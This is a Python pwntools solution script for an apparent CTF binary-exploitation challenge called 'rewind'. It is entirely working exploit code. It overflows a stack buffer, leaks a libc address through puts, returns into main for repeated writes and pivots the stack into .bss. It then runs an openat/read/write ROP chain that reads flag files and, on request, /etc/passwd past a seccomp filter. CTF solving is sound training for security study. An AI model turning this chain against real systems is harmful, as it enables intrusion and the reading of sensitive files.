#!/usr/bin/env python3
"""
rewind - vuwCTF 2026 (pwn)  ::  solution script

    $ ./solve.py                       # remote
    $ ./solve.py --paths /flag /etc/passwd
    $ ./solve.py --host 127.0.0.1 --port 1337

Bug     : read(0, bf, 208+152) into char bf[208]  -> 144 bytes past saved rip
Mitig.  : no canary, no PIE, full RELRO-less GOT, seccomp {openat,read,write,
          sendfile,exit_group}  -> no execve, the flag must be ORW'd out
Trick   : 144 bytes is only 18 gadgets, so every stage returns into main()
          again ("rewind") to get another 360-byte write.  Stage 2 stages a
          full-size chain into .bss and pivots onto it with `pop rsp`.
"""
import argparse
import re

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# ---------------------------------------------------------------- config ----
ap = argparse.ArgumentParser()
ap.add_argument('--host', default='rewind.challenges.2026.vuwctf.com')
ap.add_argument('--port', type=int, default=9966)
ap.add_argument('--libc', default='./libc.so.6')
ap.add_argument('--bin', default='./rewind')
ap.add_argument('--paths', nargs='+',
                default=['/flag.txt', '/flag', 'flag.txt', 'flag'])
ap.add_argument('-v', '--verbose', action='store_true')
args = ap.parse_args()

if args.verbose:
    context.log_level = 'debug'

exe = ELF(args.bin, checksec=False)
libc = ELF(args.libc, checksec=False)

# ------------------------------------------------------------- constants ----
OFFSET = 216                        # bf[208] + saved rbp -> saved rip
MAXIN = 360                         # BFSZ + 152, what read() accepts

POP_RDI = 0x401342                  # pop rdi ; ret     <- appended by build.sh
RET = 0x40101a                      # ret               <- stack alignment
PUTS_PLT = exe.plt['puts']
PUTS_GOT = exe.got['puts']
READ_PLT = exe.plt['read']
MAIN = exe.symbols['main']

# The RW LOAD segment ends at 0x404060 but the page 0x404000-0x405000 is
# mapped, so the tail is free scratch space.
STAGE = 0x404100                    # stage-3 chain + path strings land here
FLAGBUF = 0x404e00                  # openat/read destination

# libc 2.43 gadget offsets (verified against the provided libc.so.6)
G = {
    'pop_rsi_rbp': 0x275ed,         # pop rsi ; pop rbp ; ret
    'pop_rax': 0xd5d07,             # pop rax ; ret
    'mov_rdx_rax': 0x129b27,        # mov rdx, rax ; ret
    'pop_rsp': 0x369c5,             # pop rsp ; ret
    'syscall': 0x94606,             # syscall ; ret
}
GADGET_BYTES = {                    # re-resolved at runtime, offsets are a hint
    'pop_rsi_rbp': b'\x5e\x5d\xc3',
    'pop_rax': b'\x58\xc3',
    'mov_rdx_rax': b'\x48\x89\xc2\xc3',
    'pop_rsp': b'\x5c\xc3',
    'syscall': b'\x0f\x05\xc3',
}


def resolve_gadgets():
    """Keep the hardcoded offsets if they still match, otherwise re-search."""
    blob = libc.get_section_by_name('.text')
    base = blob.header.sh_addr
    data = blob.data()
    for name, off in G.items():
        want = GADGET_BYTES[name]
        if data[off - base:off - base + len(want)] != want:
            found = next(libc.search(want, executable=True))
            log.warn('gadget %-12s moved: %#x -> %#x', name, off, found)
            G[name] = found


def send_stage(io, chain):
    """Overwrite the saved rip of main() with `chain` and let it return."""
    payload = b'A' * OFFSET + flat(chain)
    assert len(payload) <= MAXIN, f'{len(payload)} > {MAXIN}'
    io.recvuntil(b'name your moose: \n')
    io.send(payload)


def orw(path_addr, buf=FLAGBUF, size=0x100):
    """openat(AT_FDCWD, path, O_RDONLY) -> read(3, buf, size) -> write(1, buf, n)

    A failed openat consumes no descriptor, so the first path that exists is
    always fd 3; failed read/write calls just return an error and fall through.
    """
    return [
        POP_RDI, constants.AT_FDCWD,
        G['pop_rsi_rbp'], path_addr, 0,
        G['pop_rax'], 0, G['mov_rdx_rax'],          # rdx = flags = O_RDONLY
        G['pop_rax'], constants.SYS_openat,
        G['syscall'],

        POP_RDI, 3,
        G['pop_rsi_rbp'], buf, 0,
        G['pop_rax'], size, G['mov_rdx_rax'],
        G['pop_rax'], constants.SYS_read,
        G['syscall'],

        G['mov_rdx_rax'],                           # rdx = bytes actually read
        POP_RDI, 1,
        G['pop_rsi_rbp'], buf, 0,
        G['pop_rax'], constants.SYS_write,
        G['syscall'],
    ]


def main():
    resolve_gadgets()
    io = remote(args.host, args.port)

    # -- stage 1 -----------------------------------------------------------
    # puts(puts@got) leaks libc, then rewind into main() for another read().
    # The extra RET keeps rsp 16-byte aligned across the puts() call.
    send_stage(io, [RET, POP_RDI, PUTS_GOT, PUTS_PLT, MAIN])
    io.recvuntil(b'congrats!\n')
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success('puts @ %#x', leak)
    log.success('libc @ %#x', libc.address)
    if libc.address & 0xfff:
        log.error('libc base is not page aligned - wrong libc?')
    for k in G:
        G[k] += libc.address

    # -- stage 2 -----------------------------------------------------------
    # 18 slots is not enough for ORW, so read a full chain into .bss and pivot.
    send_stage(io, [
        G['pop_rax'], 0x600, G['mov_rdx_rax'],      # rdx = 0x600
        POP_RDI, 0,                                 # rdi = stdin
        G['pop_rsi_rbp'], STAGE, 0,                 # rsi = .bss scratch
        READ_PLT,                                   # read(0, STAGE, 0x600)
        G['pop_rsp'], STAGE,                        # pivot onto it
    ])
    io.recvuntil(b'congrats!\n')

    # -- stage 3 -----------------------------------------------------------
    # chain first, NUL-terminated path strings packed right behind it.
    strs = b''.join(p.encode() + b'\x00' for p in args.paths)
    tail = [POP_RDI, 0, G['pop_rax'], constants.SYS_exit_group, G['syscall']]
    nchain = len(flat(orw(0))) * len(args.paths) + len(flat(tail))

    chain, off = [], STAGE + nchain
    for p in args.paths:
        chain += orw(off)
        off += len(p) + 1
    chain += tail

    blob = flat(chain) + strs
    assert len(blob) <= 0x600, 'stage-3 chain too big for one read()'
    io.send(blob)

    out = io.recvall(timeout=10)
    log.info('output:\n%s', out.decode(errors='replace').strip())

    flag = re.search(rb'VuwCTF\{[^}]*\}', out)
    if flag:
        log.success(flag.group().decode())
    else:
        log.failure('no flag - try other paths with --paths')


if __name__ == '__main__':
    main()
